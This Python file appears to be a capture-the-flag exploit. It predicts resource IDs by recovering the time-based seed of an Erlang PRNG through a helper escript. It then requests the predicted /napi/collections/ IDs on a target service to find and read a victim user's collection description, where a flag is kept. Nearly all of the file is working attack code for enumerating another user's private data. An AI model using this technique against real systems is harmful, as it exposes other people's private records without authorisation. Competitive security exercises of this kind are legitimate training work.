"""
PRNG-predictable vuln: calls an Erlang escript that brute-forces the
dynamic seed T for rand:seed(exsss, {T, T+1, T+2}) via 3 observations.
Uses exponential + binary search to minimize HTTP requests.
"""

import asyncio
import subprocess
import os
from typing import Optional
import httpx

BURST_SIZE = 1
ESCRIPT_PATH = os.path.join(os.path.dirname(__file__), "crack.erl")


def recover_state(observed: list[str]) -> Optional[list[str]]:
    if not observed:
        return None

    try:
        result = subprocess.run(
            ["escript", ESCRIPT_PATH, *observed],
            capture_output=True, text=True,             timeout=60,
            env={**os.environ, "ERL_FLAGS": "-sctp"},
        )
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        raise RuntimeError(f"escript failed: {e}")

    stdout = result.stdout
    clean = "\n".join(
        l for l in stdout.split("\n")
        if not any(w in l for w in ("ESOCK", "ESSIO", "sctp", "Warning:", "Warning "))
        and not l.strip().startswith("%")
    )
    if "not_found" in clean or "validate_failed" in clean:
        msg = clean.strip().split("\n")[0] if clean.strip() else stdout[:200]
        raise RuntimeError(f"escript: {msg}")

    lines = [l.strip() for l in clean.strip().split("\n") if l.strip()]
    if not lines:
        return None
    return lines


async def _check_collection(conn, pid: str, victim_name: str) -> Optional[str]:
    try:
        r = await conn.get(
            f"/napi/collections/{pid}",
            cookies=None,
            timeout=httpx.Timeout(1.0, connect=1.0),
        )
        if r.status_code != 200:
            return None
        data = r.json()
        if data.get("user", {}).get("username", "").lower() != victim_name.lower():
            return None
        return data.get("description") or ""
    except Exception:
        return None


async def find_victim_collection(
    conn,
    predictions: list[str],
    victim_name: str,
    batch_size: int = 50,
) -> Optional[str]:
    if not predictions:
        return None

    # Reverse linear scan (newest first) — flag is near the end
    for i in range(len(predictions) - batch_size, -1, -batch_size):
        start = max(0, i)
        batch = predictions[start : i + batch_size]
        tasks = [
            _check_collection(conn, pid, victim_name)
            for pid in batch
        ]
        results = await asyncio.gather(*tasks)
        for desc in results:
            if desc:
                return desc

    return None
